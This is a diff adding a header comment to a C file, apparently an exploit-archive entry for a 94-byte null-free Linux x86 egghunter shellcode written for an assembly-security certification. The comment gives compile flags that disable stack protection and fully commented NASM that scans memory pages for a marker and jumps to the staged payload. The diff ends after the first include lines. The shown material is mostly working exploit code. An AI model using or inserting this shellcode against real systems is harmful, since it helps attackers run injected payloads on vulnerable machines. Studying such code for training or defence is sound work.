@@ -1,3 +1,47 @@
+/*
+# Exploit Title: Linux x86 Egghunter Shellcode (94 bytes/null free)
+# Date: 2018-08-26
+# Shellcode Author: Kevin Kirsche
+# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_3-egghunter
+# Tested on: Ubuntu 18.04 with gcc 7.3.0
+
+This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+Student ID: SLAE-1134
+
+Compilation instructions:
+	gcc -o shellcode shellcode.c -fno-stack-protector -z execstack
+
+Commented NASM:
+  global _start
+
+  section .text
+
+  _start:
+    xor edx, edx        ; we can't use cdq because we don't know the sign of EAX :(
+  loop_page:
+    ; view your page size with `getconf PAGESIZE`
+    ; getconf PAGESIZE == 4096 decimal / 0x1000 hex
+    or dx, 0xfff        ; 0xfff hex == 4065 decimal
+  next_addr:
+    inc edx             ; increment our pointer by one
+    lea ebx, [edx+0x4]    ; load where our potential eggs are
+    push byte 0x21           ; access system call
+    pop eax             ; push / pop used to avoid XOR
+    int 0x80            ; check if we have access to the EBX address(es)
+    cmp al, 0xf2        ; if 0xf2, we have an EFAULT
+    jz loop_page        ; we don't have access :( next page!
+  compare:
+    mov eax, 0x73676733 ; 3ggs in little-endian, representing our egg!
+    mov edi, edx        ; put the address to compare into EDI for the scasd operation
+    ; about scasd - https://c9x.me/x86/html/file_module_x86_id_287.html
+    scasd               ; if [EDI] == EAX - note: scasd checks a double word (4 bytes) then increments EDI
+    jnz next_addr       ; this isn't our egg :( let's move on
+    scasd               ; if [EDI] == EAX then we found our egg!
+    jnz next_addr       ; nope :( unlucky it seems
+  matched:
+    jmp edi             ; let's execute our egg!
+*/
 #include <stdio.h>
 #include <string.h>
 
